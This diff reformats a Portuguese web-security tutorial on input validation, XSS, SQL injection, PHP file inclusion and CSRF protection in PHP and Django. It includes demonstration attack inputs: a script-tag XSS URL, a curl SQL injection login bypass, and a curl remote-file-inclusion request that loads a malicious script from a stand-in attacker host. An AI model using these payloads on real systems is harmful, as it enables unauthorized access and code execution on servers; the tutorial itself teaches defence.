@@ -75,16 +75,19 @@ assunto é segurança.
 
 *URLs* que antes eram feitas dessa maneira:
 
-> /blog.php?year=2012&month=12&day=21
+    ::bash
+    /blog.php?year=2012&month=12&day=21
 
 Podem ser reproduzidas desta forma:
 
-> /blog/2012/12/21/
+    ::bash
+    /blog/2012/12/21/
 
 O mecanismo de rotas de alguns *frameworks* permite a utilização de
 expressões regulares na construção do caminho. Por exemplo, em *Django*
 temos o seguinte cenário:
 
+    ::python
     # urls.py
 
     urlpatterns = patterns('',
@@ -105,6 +108,7 @@ contrário, se a rota não bater com nenhum padrão informado (por exemplo,
 
 Em nossa *view*, resgataríamos esses valores da seguinte forma:
 
+    ::python
     # blog/views.py
     
     def index(request, year, month, day):
@@ -116,6 +120,7 @@ temos certeza do seu tipo e tamanho.
 O mesmo resultado pode ser obtido com o *Codeigniter*, basta adicionar a
 expressão desejada em seu **application/config/routes.php**:
 
+    ::php
     # application/config/routes.php
     
     $route['blog/(\d{4})/([0-9]{2})/(\d{2})'] = "blog/index/$1/$2/$3";
@@ -146,6 +151,7 @@ pesquisado via *GET*).
 Nesse caso, “forçamos” o tipo do dado informado, e diminuímos problemas
 de interpretação do nosso código:
 
+    ::php
     <?php
 
     $page = isset($_GET['page']) && preg_match('/^\d+$/', $_GET['page']) ? $_GET['page'] : 1;
@@ -186,6 +192,7 @@ Scripting*** (ou *XSS*).
 Uma maneira muito comum de evitar esse tipo de problema é simplesmente
 “escapando” ou removendo elementos *HTML* do conteúdo:
 
+    ::php
     <?php
     # xss.php
     
@@ -199,7 +206,8 @@ Acessar **xss.php** com um **alert** *Javascript* como parâmetro, não
 executará o comando, e sim apenas exibirá o conteúdo na tela, com os
 caracteres que delimitam o elemento **script** devidamente formatados:
 
-> http://localhost/xss.php?var=&lt;script&gt;alert("XSS!");&lt;/script&gt;
+    ::bash
+    http://localhost/xss.php?var=&lt;script&gt;alert("XSS!");&lt;/script&gt;
 
 Existem alguns [*Rich Text Editors*][] que verificam e formatam o
 conteúdo do campo antes de uma submissão. Mas **lembre-se**! Editores
@@ -233,18 +241,19 @@ destrutivas, tanto para a sua aplicação, quanto para os seus usuários.
 
 Segundo o *Wikipedia*:
 
-<cite>É um tipo de ameaça de segurança que se aproveita de falhas em
-sistemas que interagem com bases de dados via SQL. A injeção de
-SQL ocorre quando o atacante consegue inserir
-uma série de instruções SQL dentro de uma
-consulta (query) através da manipulação das entrada de dados de uma
-aplicação.</cite>
+> É um tipo de ameaça de segurança que se aproveita de falhas em
+> sistemas que interagem com bases de dados via SQL. A injeção de
+> SQL ocorre quando o atacante consegue inserir
+> uma série de instruções SQL dentro de uma
+> consulta (query) através da manipulação das entrada de dados de uma
+> aplicação.
 
 Os resultados podem ser os mais desastrosos, como por exemplo, o acesso
 de usuários não autorizados a áreas restritas, e o roubo de informações
 da sua base de dados. Abaixo, uma autenticação simples, utilizando nome
 de usuário e senha:
 
+    ::php
     <?php
     # sql-injection.php
     
@@ -282,24 +291,27 @@ Levando em consideração que temos um usuário com nome **teste** e senha
 **teste**, se executarmos a instrução abaixo, será exibida uma mensagem
 de *login* inválido:
 
-> $ curl --data "usuario=foo&senha=bar" http://localhost/sql-injection.php<br>
->
-> Usuário e senha inválidos
+    ::bash
+    $ curl --data "usuario=foo&senha=bar" http://localhost/sql-injection.php
+
+    Usuário e senha inválidos
 
 Evidente! Este usuário não existe no banco de dados. Mas, podemos
 imaginar que a aplicação não possua proteção contra injeções *SQL*,
 então podemos fazer com que a consulta retorne positivo, e que nosso
 acesso seja garantido mesmo não possuindo um usuário no banco de dados.
 
-> $ curl --data "usuario=foo&senha=bar' OR '1' = '1" http://localhost/sql-injection.php<br>
->
-> Login com sucesso
+    ::bash
+    $ curl --data "usuario=foo&senha=bar' OR '1' = '1" http://localhost/sql-injection.php
+
+    Login com sucesso
 
 A nossa *query*, por não fazermos um tratamento nos campos do
 formulário, foi composta pelo valor **bar’ OR '1’ = ’1**, o que resultou
 no seguinte *SQL*:
 
-> SELECT 1 FROM usuario WHERE usuario = 'foo' AND senha = 'bar' OR '1' = '1'
+    ::sql
+    SELECT 1 FROM usuario WHERE usuario = 'foo' AND senha = 'bar' OR '1' = '1'
 
 Existem algumas soluções para este problema, como o uso de
 **addslashes** no *PHP*, mas os que fazem mais sentido para mim são:
@@ -312,12 +324,14 @@ Existem algumas soluções para este problema, como o uso de
 A primeira é a mais prática de aplicarmos. No código anterior, bastaria
 formatar os valores na hora que são resgatados do *array* **$\_POST**:
 
+    ::php
     $usuario    = mysql_real_escape_string($_POST['usuario']);
     $senha      = mysql_real_escape_string($_POST['senha']);
 
 Com o **mysqli**, precisamos fazer algumas alterações no código, como
 demonstrado abaixo:
 
+    ::php
     <?php
     # sql-injection.php (com mysqli)
     
@@ -394,6 +408,7 @@ o conteúdo do bloco principal da página. Acontece que em alguns casos, o
 desenvolvedor espera que um determinado arquivo seja importado de acordo
 com a *URL* que o internauta está visitando. Por exemplo:
 
+    ::php
     <?php
     # php-injection.php
     
@@ -406,7 +421,10 @@ com a *URL* que o internauta está visitando. Por exemplo:
     
     ?>
 
-> $ curl http://localhost/php-injection.php?page=novidades.php
+Logo:
+
+    ::bash
+    $ curl http://localhost/php-injection.php?page=novidades.php
 
 No caso acima, estamos incluindo o arquivo **novidades.php** e
 automaticamente exibindo o seu conteúdo. Podemos navegar por outras
@@ -423,7 +441,8 @@ de importar arquivos de outros *hosts*. Logo, o atacante pode ter um
 para a aplicação acima. A aplicação incluirá e interpretará o *PHP* que
 estiver neste *script*:
 
-> $ curl http://localhost/php-injection.php?page=http://sitedoatacante.com.br/meu-script-malicioso.php.txt
+    ::bash
+    $ curl http://localhost/php-injection.php?page=http://sitedoatacante.com.br/meu-script-malicioso.php.txt
 
 Pronto! Temos código *PHP* de outra pessoa executando em nosso servidor.
 
@@ -432,6 +451,7 @@ em seu **php.ini** como **FALSE**. Outro passo importante é, sempre que
 for importar algum arquivo que dependa de informações vindas do usuário,
 verifique o conteúdo desta informação. Exemplo:
 
+    ::php
     switch($page) {
         case 'novidades':
             include('novidades.php');
@@ -485,6 +505,7 @@ para prevenir ataques *CSRF*. No *Django*, com o *middleware*
 **django.middleware.csrf.CsrfViewMiddleware**, basta adicionar a chamada
 da *templatetag* ao formulário:
 
+    ::html
     <form method="post" action=".">
         {% csrf_token %}
         ...
@@ -504,6 +525,7 @@ No *Codeigniter*, com a opção **$config['csrf\_protection’]** como
 adicionará automaticamente o campo de proteção *CSRF* na abertura do
 formulário:
 
+    ::php
     <?php form_open(); ?>
 
 
